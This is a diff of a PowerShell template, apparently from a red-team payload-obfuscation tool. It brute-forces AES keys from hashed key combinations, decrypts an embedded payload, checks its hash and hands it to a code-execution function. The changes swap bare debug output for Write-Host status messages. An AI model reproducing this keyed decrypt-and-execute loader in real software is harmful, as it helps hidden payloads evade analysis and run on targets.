@@ -39,7 +39,6 @@ function Get-DecryptedString($key, $encryptedStringWithIV) {{
     $decryptor = $aesManaged.CreateDecryptor();
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
     $aesManaged.Dispose()
-    #[System.Text.Encoding]::ASCII.GetString($unencryptedData).Trim([char]0)
     return $unencryptedData
 }}
 
@@ -55,6 +54,7 @@ function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
 }}
 
 function Get-CodeExecution($key, $payload){{
+  Write-Host "[*] In code execution function"
 	$encryptedString = "{3}"
   $decrypted_loader = Get-DecryptedString $key $encryptedString
 	$decoded_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader).Trim([char]0)
@@ -64,11 +64,9 @@ function Get-CodeExecution($key, $payload){{
 #build function
 function Get-R-Done($lookup_table, $payload_hash, $minus_bytes, $key_combos, $key_iterations){{
 	# Iterate through $key_combos
-	$key_combos
-    $key_list = @()
+	$key_list = @()
 	$another_temp = @()
     foreach ($item in $key_combos){{
-      $item
       if ($item.GetType().Name -eq "String") {{  
           $key_list.count
           if ($key_list.count -eq 0){{
@@ -96,26 +94,21 @@ function Get-R-Done($lookup_table, $payload_hash, $minus_bytes, $key_combos, $ke
             }}
         }}
     }}
-    $key_list
-
+    
 	 foreach ($keyvalue in $key_list){{
-       $keyvalue
-       "=" * 50
+       Write-Host "[*] Testing keyvalue:" $keyvalue
+       $barrier = "=" * 50
+       Write-Host $barrier
         $iteration_temp = $key_iterations
-        $iteration_temp
-        $keyvalue
         $sha512 = new-Object System.Security.Cryptography.SHA512Managed
         $keyvalue = [system.Text.Encoding]::UTF8.GetBytes($keyvalue.ToLower())
 	      while ($iteration_temp -ne 1){{
             $keyvalue = $sha512.ComputeHash($keyvalue)
             $iteration_temp--
         }}
-        $keyvalue.GetType()
         $keyvalue = $sha512.ComputeHash($keyvalue)
         $keyvalue = [System.Convert]::ToBase64String($keyvalue[0..31])
-        #$keyvalue = [System.Convert]::ToBase64String($sha512.ComputeHash([system.Text.Encoding]::UTF8.GetBytes($keyvalue))[0..31])
-        #[System.BitConverter]::ToString($sha512.ComputeHash([system.Text.Encoding]::UTF8.GetBytes($payload.Substring(0,$payload.Length-$minus_bytes)))).ToLower().Replace("-", "")
-        "Keyvalue", $keyvalue
+        Write-Host "[*] Testing key:", $keyvalue
         try {{
         	$payload = Get-DecryptedString $keyvalue $lookup_table
         	$result = Get-CheckHash $payload $payload_hash $minus_bytes
@@ -123,9 +116,9 @@ function Get-R-Done($lookup_table, $payload_hash, $minus_bytes, $key_combos, $ke
         }} Catch {{
         	$result = 0
         }}
-        $keyvalue.GetType()
-	      if ($result -eq 1){{
-            "hashes match"
+        
+        if ($result -eq 1){{
+            Write-Host "[*] Hashes match"
             Get-CodeExecution $keyvalue $payload
         }}
     }}
